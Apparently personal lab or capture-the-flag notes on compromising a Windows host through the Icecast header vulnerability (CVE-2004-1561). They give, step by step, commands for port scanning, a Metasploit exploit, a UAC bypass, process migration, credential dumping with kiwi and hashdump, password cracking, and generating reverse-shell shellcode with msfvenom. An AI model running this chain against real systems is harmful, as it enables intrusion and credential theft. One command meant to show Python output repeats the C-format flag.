#WindowsExploitation 
### Recon
Start with a stealth syn scan using nmap
```nmap
sudo nmap -sS -n --open -vvv -Pn -p- -T4 machine_ip -oG allPorts
```
Obtain the open ports from allPorts with the function extractPorts
`extractPorts allPorts`
Next, a service and version scan
```nmap
nmap -sC -sV -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 machine_ip -oN targeted
```

### Gain Access
Look for information on Icecast
[CVE Details](https://www.cvedetails.com/)
[CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/)
```msfconsole
search icecast
use exploit/windows/http/icecast_header
set RHOSTS machine_ip
set LHOST attacker_ip
exploit
```

### Escalate Privileges
```meterpreter session 1
getuid
sysinfo
run post/multi/recon/local_exploit_suggester
```
`exploit/windows/local/bypassuac_eventvwr` is the privesc technique to use
`bg` or `Ctrl+z` -> to background the session
```msfconsole
use exploit/windows/local/bypassuac_eventvwr
set SEESION # 
set LHOST attacker_ip
run
```
```meterpreter session 2
getprivs
```
`SeTakeOwnershipPrivilege` -> take ownership of files

### Looting
We need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows
```meterpreter session 2
ps
```
In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service runs with SYSTEM-level privileges by default, and it will restart if crashed
`spoolsv.exe` -> printer spool service
```meterpreter session 2
migrate spoolsv.exe
getuid
load kiwi
creds_all
run post/windows/manage/enable_rdp
```
*Crack the password with john*
Use `hashdump` on the meterpreter session
Insert the hashes into a hashes.txt
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=NT`

---
### Manual Exploitation
`searchsploit Icecast`
Both versions of th exploit will not work, as they are outdated. A more modern version can be found in the following github repository [CVE-2004-1561](https://github.com/ivanitlearning/CVE-2004-1561.git)
`git clone https://github.com/ivanitlearning/CVE-2004-1561.git`

The code written in python and C will now work. However, in order for it to do so, new shellcode has to be generated with msfvenom 
The command to achieve this is the following:
```msfvenom
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=Attacker_machine_ip LPORT=4444 -b '\x0a\x0d\x00' -f c
```
This command takes into account the attacker's ip and the port to listen to for the reverse shell. This parameter can vary.
It also considers badchars or bad characters. A bad character is an unwanted character that can be used to break shellcode. Depending on the application and the developer logic there is a different set of bad characters that a developer can specify for every program.
Common badchars include: 

```bash
\x00 = Null Byte o end of string
\x0a = New Line \n (linux)
\x0d = Carriage Return  \r (linux)
```

msfvenom can also output a python format
```msfvenom
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=Attacker_machine_ip LPORT=4444 -b '\x0a\x0d\x00' -f c
```

Replace the shellcode in the python script or in the C code.